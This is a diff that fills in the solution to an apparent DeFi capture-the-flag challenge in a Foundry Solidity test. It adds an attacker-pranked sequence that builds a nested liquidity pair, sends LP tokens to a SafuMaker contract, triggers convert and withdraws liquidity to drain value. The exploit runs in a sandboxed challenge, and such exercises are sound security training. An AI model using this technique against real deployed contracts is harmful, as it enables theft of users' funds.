@@ -110,8 +110,56 @@ contract Testing is Test {
     /// solves the challenge
     function testChallengeExploit() public {
         vm.startPrank(attacker,attacker);
-
+        
         // implement solution here
+        usdc.approve(address(safuRouter), type(uint256).max);
+        safu.approve(address(safuRouter), type(uint256).max);
+        safuPair.approve(address(safuRouter), type(uint256).max);
+
+        safuRouter.addLiquidity(
+            address(usdc),
+            address(safu),
+            10e18,
+            10e18,
+            0,0,
+            attacker,
+            block.timestamp
+        );
+
+        safuRouter.addLiquidity(
+            address(safuPair),
+            address(safu),
+            safuPair.balanceOf(attacker),
+            10e18,
+            0,0,
+            attacker,
+            block.timestamp
+        );
+
+        IUniswapV2Pair pair2 = IUniswapV2Pair(safuFactory.getPair(address(safuPair),address(safu)));
+        pair2.transfer(address(safuMaker), pair2.balanceOf(attacker)/100);
+
+        safuMaker.convert(address(safu), address(safuPair));
+
+        pair2.approve(address(safuRouter), type(uint256).max);
+        safuRouter.removeLiquidity(
+            address(safuPair),
+            address(safu),
+            pair2.balanceOf(attacker), 
+            0, 
+            0, 
+            attacker, 
+            block.timestamp
+        );
+        safuRouter.removeLiquidity(
+            address(usdc),
+            address(safu),
+            safuPair.balanceOf(attacker), 
+            0, 
+            0, 
+            attacker, 
+            block.timestamp
+        );
 
         vm.stopPrank();
         validation();
